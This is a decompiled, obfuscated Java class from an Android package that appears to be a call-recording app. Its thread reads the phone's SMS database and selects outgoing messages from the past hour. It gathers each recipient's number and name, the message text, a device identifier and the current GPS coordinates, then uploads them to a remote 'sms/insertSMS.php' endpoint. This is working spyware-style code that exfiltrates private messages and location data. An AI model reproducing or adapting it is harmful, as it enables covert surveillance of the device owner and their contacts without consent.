package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.Telephony.Sms;
import com.app.received.LocationReceived;
import com.crashlytics.android.Crashlytics;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: Out */
public class i extends Thread {

    /* renamed from: c reason: collision with root package name */
    private static String f235c = "";

    /* renamed from: a reason: collision with root package name */
    private final Context f236a;

    /* renamed from: b reason: collision with root package name */
    private String f237b = "";

    public i(Context context) {
        this.f236a = context;
    }

    private void a(Cursor cursor) {
        int i;
        int i2;
        int i3;
        try {
            String str = "type";
            if (VERSION.SDK_INT >= 19) {
                i = cursor.getInt(cursor.getColumnIndex(str));
            } else {
                i = cursor.getInt(cursor.getColumnIndex(str));
            }
            if (i == 1) {
                cursor.moveToNext();
                if (VERSION.SDK_INT >= 19) {
                    i2 = cursor.getInt(cursor.getColumnIndex(str));
                } else {
                    i2 = cursor.getInt(cursor.getColumnIndex(str));
                }
                if (i2 == 1) {
                    cursor.moveToNext();
                    if (VERSION.SDK_INT >= 19) {
                        i3 = cursor.getInt(cursor.getColumnIndex(str));
                    } else {
                        i3 = cursor.getInt(cursor.getColumnIndex(str));
                    }
                    if (i3 != 1) {
                        a(cursor, i3);
                        return;
                    }
                    return;
                }
                a(cursor, i2);
                return;
            }
            a(cursor, i);
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:18:0x003a */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0040 A[Catch:{ Exception -> 0x0048 }] */
    /* JADX WARNING: Removed duplicated region for block: B:28:? A[RETURN, SYNTHETIC] */
    public void run() {
        Uri parse;
        try {
            if (VERSION.SDK_INT >= 19) {
                parse = Sms.CONTENT_URI;
            } else {
                parse = Uri.parse("content://sms");
            }
            Cursor query = this.f236a.getContentResolver().query(parse, null, null, null, null);
            if (query != null && query.getCount() != 0) {
                if (!query.moveToFirst()) {
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e2) {
                        e2.getStackTrace();
                        Crashlytics.logException(e2);
                    }
                    if (!query.moveToFirst()) {
                        a(query);
                        return;
                    }
                    return;
                }
                a(query);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
        }
    }

    private void a(Cursor cursor, int i) throws Exception {
        Long l;
        String str;
        String str2;
        String str3;
        long j;
        double d2;
        double d3;
        Cursor cursor2 = cursor;
        int i2 = i;
        String str4 = "date";
        try {
            if (VERSION.SDK_INT >= 19) {
                l = Long.valueOf(cursor2.getLong(cursor2.getColumnIndexOrThrow(str4)));
            } else {
                l = Long.valueOf(cursor2.getLong(cursor2.getColumnIndexOrThrow(str4)));
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            l = null;
        }
        if (l == null) {
            String str5 = "date_sent";
            if (VERSION.SDK_INT >= 19) {
                l = Long.valueOf(cursor2.getLong(cursor2.getColumnIndexOrThrow(str5)));
            } else {
                l = Long.valueOf(cursor2.getLong(cursor2.getColumnIndexOrThrow(str5)));
            }
        }
        Calendar instance = Calendar.getInstance();
        instance.setTimeInMillis(l.longValue());
        Calendar instance2 = Calendar.getInstance();
        instance2.setTime(new Date());
        instance2.add(11, -1);
        if (!instance.before(instance2)) {
            String str6 = "protocol";
            if (VERSION.SDK_INT >= 19) {
                str = cursor2.getString(cursor2.getColumnIndexOrThrow(str6));
            } else {
                str = cursor2.getString(cursor2.getColumnIndexOrThrow(str6));
            }
            if ((str == null || str.equals("0")) && (i2 == 2 || i2 == 4 || i2 == 6)) {
                String string = cursor2.getString(cursor2.getColumnIndexOrThrow("_id"));
                String str7 = "address";
                if (VERSION.SDK_INT >= 19) {
                    str2 = cursor2.getString(cursor2.getColumnIndexOrThrow(str7));
                } else {
                    str2 = cursor2.getString(cursor2.getColumnIndexOrThrow(str7));
                }
                String str8 = str2;
                String str9 = "body";
                if (VERSION.SDK_INT >= 19) {
                    str3 = cursor2.getString(cursor2.getColumnIndexOrThrow(str9));
                } else {
                    str3 = cursor2.getString(cursor2.getColumnIndexOrThrow(str9));
                }
                String str10 = str3;
                StringBuilder sb = new StringBuilder();
                StringBuilder sb2 = new StringBuilder();
                sb2.append(string);
                sb2.append(str8);
                sb2.append(str10);
                sb.append(c.c(sb2.toString()));
                sb.append(" ");
                this.f237b = sb.toString();
                if (!f235c.contains(this.f237b)) {
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(f235c);
                    sb3.append(this.f237b);
                    f235c = sb3.toString();
                    String str11 = "";
                    if (f235c.length() > 10000) {
                        f235c = str11;
                    }
                    new k(this.f236a, str8, str10, 2).start();
                    Location a2 = LocationReceived.a();
                    double d4 = 0.0d;
                    if (a2 != null) {
                        d4 = a2.getLongitude();
                        d3 = a2.getLatitude();
                        d2 = (double) a2.getAccuracy();
                        j = a2.getTime();
                    } else {
                        j = 0;
                        d3 = 0.0d;
                        d2 = 0.0d;
                    }
                    String a3 = LocationReceived.a(this.f236a);
                    SimpleDateFormat d5 = c.d();
                    String format = d5.format(instance.getTime());
                    if (j != 0) {
                        a3 = a.a(a3, "###DATELOC###", d5.format(Long.valueOf(j)));
                    }
                    String a4 = c.a(this.f236a, str8);
                    HashMap hashMap = new HashMap();
                    double d6 = d2;
                    StringBuilder a5 = a.a(str11);
                    a5.append(e.e(this.f236a));
                    hashMap.put("idPhone", a5.toString());
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append(str11);
                    sb4.append(a4);
                    hashMap.put("name", sb4.toString());
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append(str11);
                    sb5.append(str8);
                    hashMap.put("number", sb5.toString());
                    StringBuilder sb6 = new StringBuilder();
                    sb6.append(str11);
                    sb6.append(str10);
                    hashMap.put("message", sb6.toString());
                    hashMap.put("type", "2");
                    StringBuilder sb7 = new StringBuilder();
                    sb7.append(str11);
                    sb7.append(format);
                    hashMap.put(str4, sb7.toString());
                    StringBuilder sb8 = new StringBuilder();
                    sb8.append(str11);
                    sb8.append(a3);
                    hashMap.put(str7, sb8.toString());
                    StringBuilder sb9 = new StringBuilder();
                    sb9.append(str11);
                    sb9.append(d4);
                    hashMap.put("longitude", sb9.toString());
                    StringBuilder sb10 = new StringBuilder();
                    sb10.append(str11);
                    sb10.append(d3);
                    hashMap.put("latitude", sb10.toString());
                    StringBuilder sb11 = new StringBuilder();
                    sb11.append(str11);
                    double d7 = d6;
                    sb11.append(d7);
                    hashMap.put("accuracy", sb11.toString());
                    try {
                        StringBuilder sb12 = new StringBuilder();
                        sb12.append(str11);
                        sb12.append(format);
                        String sb13 = sb12.toString();
                        StringBuilder sb14 = new StringBuilder();
                        sb14.append(str11);
                        sb14.append(d4);
                        String sb15 = sb14.toString();
                        StringBuilder sb16 = new StringBuilder();
                        sb16.append(str11);
                        sb16.append(d3);
                        String sb17 = sb16.toString();
                        StringBuilder sb18 = new StringBuilder();
                        sb18.append(str11);
                        sb18.append(d7);
                        long a6 = a.a.a(a4, str8, str10, 2, sb13, a3, sb15, sb17, sb18.toString(), this.f236a);
                        if (a.c.e.a.b("sms/insertSMS.php", (Map<String, String>) hashMap)) {
                            a.a.e((int) a6, this.f236a);
                        }
                    } catch (Exception e3) {
                        e3.getStackTrace();
                    }
                }
            }
        }
    }
}
